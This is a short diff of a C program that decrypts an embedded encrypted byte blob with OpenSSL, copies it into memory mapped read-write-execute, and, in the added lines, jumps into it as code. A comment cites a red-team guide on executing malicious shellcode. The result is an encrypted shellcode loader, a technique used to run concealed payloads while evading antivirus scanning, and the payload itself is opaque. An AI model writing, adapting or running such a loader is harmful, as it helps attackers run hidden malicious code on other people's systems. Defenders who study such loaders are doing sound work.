@@ -11,6 +11,7 @@
 #include <string.h>
 #include <unistd.h>
 
+
 // https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption
 
 // 128 bits
@@ -31,6 +32,7 @@ unsigned char text[] = {
 		0xe9, 0xe6, 0xe2, 0xc9, 0xac, 0xb2, 0x70, 0x46, 0xf0, 0xe4, 0x9d, 0x67,
 		0xce, 0x47, 0xb7, 0x17, 0x02, 0x4c, 0x0e, 0x51
 };
+
 unsigned int text_len = 80;
 
 unsigned char plaintext[80];
@@ -45,11 +47,12 @@ void print_hex(unsigned char plaintext[], int len) {
 }
 
 int get_plaintext() {
+	
 	EVP_CIPHER_CTX *ctx;
 	int len;
 	int plaintext_len;
 	int ret;
-
+	
 	/* Create and initialise the context */
 	if(!(ctx = EVP_CIPHER_CTX_new())) {
 		fprintf(stderr, "error: failed to create and initialise the context\n");
@@ -96,14 +99,17 @@ int get_plaintext() {
 int main(int ac, char **av) {
 
 	int plaintext_len = get_plaintext();
+	void (*pf)(void);
 
-	if (plaintext_len) {
+	if (plaintext_len)
 		print_hex(plaintext, plaintext_len);
-	}
-	unsigned char *dest = mmap(NULL, plaintext_len + 1, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
 
-	memset(dest, 0, plaintext_len + 1);
+	unsigned char *dest = mmap(NULL, plaintext_len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+
+	memset(dest, 0, plaintext_len);
 	memcpy(dest, plaintext, plaintext_len);
+
+	((void(*)())dest)(); // https://medium.com/@lsecqt/red-teaming-101-executing-malicious-shellcode-with-c-a-guide-for-beginners-439bff63721d
 
 	munmap(dest, plaintext_len);
 	return 0;
